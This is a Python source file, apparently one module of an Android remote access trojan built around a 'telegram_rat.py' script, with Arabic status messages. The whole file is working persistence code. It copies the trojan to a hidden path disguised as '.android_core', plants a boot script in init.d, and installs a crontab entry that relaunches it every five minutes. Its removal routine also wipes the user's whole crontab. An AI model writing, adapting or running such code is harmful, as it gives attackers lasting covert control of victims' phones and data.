import os, time, subprocess

class PersistenceManager:
    def __init__(self):
        self.techniques = []
        self.script_path = os.path.abspath(__file__)
        self.main_script = os.path.join(
            os.path.dirname(os.path.dirname(self.script_path)),
            'telegram_rat.py'
        )

    def install(self) -> str:
        results = []
        results.append(self._local_tmp())
        results.append(self._initd())
        results.append(self._crontab())
        return "\n".join(results)

    def _local_tmp(self) -> str:
        dest = "/data/local/tmp/.android_core"
        try:
            os.system(f"cp {self.main_script} {dest} 2>/dev/null")
            os.system(f"chmod 755 {dest} 2>/dev/null")
            if os.path.exists(dest):
                self.techniques.append('local_tmp')
                return f"✅ local_tmp ({os.path.getsize(dest)/1024:.1f}KB)"
            return "⚠️ local_tmp (فشل)"
        except Exception as e:
            return f"❌ local_tmp ({e})"

    def _initd(self) -> str:
        init_dirs = ["/system/etc/init.d", "/etc/init.d"]
        init_content = f"#!/system/bin/sh\nsleep 30\npython3 /data/local/tmp/.android_core &\n"
        for d in init_dirs:
            if os.path.exists(d) and os.access(d, os.W_OK):
                try:
                    sp = os.path.join(d, "99-core")
                    with open(sp, 'w') as f:
                        f.write(init_content)
                    os.system(f"chmod 755 {sp}")
                    self.techniques.append('initd')
                    return f"✅ init.d ({sp})"
                except:
                    pass
        return "ℹ️ init.d غير متاح"

    def _crontab(self) -> str:
        try:
            cron_cmd = "*/5 * * * * python3 /data/local/tmp/.android_core"
            current = subprocess.getoutput("crontab -l 2>/dev/null")
            if cron_cmd not in current:
                new_cron = (current + "\n" + cron_cmd + "\n") if current else (cron_cmd + "\n")
                with open("/sdcard/.cron_tmp", "w") as f:
                    f.write(new_cron)
                os.system("crontab /sdcard/.cron_tmp 2>/dev/null")
                os.system("rm -f /sdcard/.cron_tmp")
                self.techniques.append('crontab')
                return "✅ crontab (كل 5 دقائق)"
            return "ℹ️ crontab موجود"
        except:
            return "ℹ️ crontab غير متاح"

    def check_status(self) -> str:
        if not self.techniques:
            return "⚠️ لا Persistence"
        lines = []
        for t in self.techniques:
            if t == 'local_tmp':
                lines.append(f"{'✅' if os.path.exists('/data/local/tmp/.android_core') else '❌'} local_tmp")
            elif t == 'initd':
                lines.append("✅ init.d")
            elif t == 'crontab':
                cr = subprocess.getoutput("crontab -l 2>/dev/null | grep android_core")
                lines.append(f"{'✅' if cr else '❌'} crontab")
        return "📌 Persistence:\n" + "\n".join(lines)

    def remove_all(self) -> str:
        try:
            os.system("rm -f /data/local/tmp/.android_core /system/etc/init.d/99-core /sdcard/.cron_tmp 2>/dev/null")
            os.system("crontab -r 2>/dev/null")
            self.techniques.clear()
            return "🗑️ تمت الإزالة"
        except Exception as e:
            return f"❌ {e}"
